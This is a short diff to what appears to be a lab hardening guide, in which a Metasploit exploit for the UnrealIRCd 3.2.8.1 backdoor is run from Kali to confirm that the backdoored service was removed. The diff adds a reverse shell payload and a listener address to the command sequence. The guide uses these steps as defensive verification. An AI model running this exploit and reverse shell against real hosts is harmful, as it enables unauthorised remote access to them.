@@ -123,9 +123,10 @@ Check nothing is listening on IRC ports (6667, 6697):
 
 Verify from Kali after removal:
 
-- `msfconsole`
 - `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+- `set payload cmd/unix/reverse`
 - `set RHOST 172.16.30.60`
+- `set LHOST 172.16.30.75`
 - `exploit`
 
 Should return "connection refused" or fail to connect.
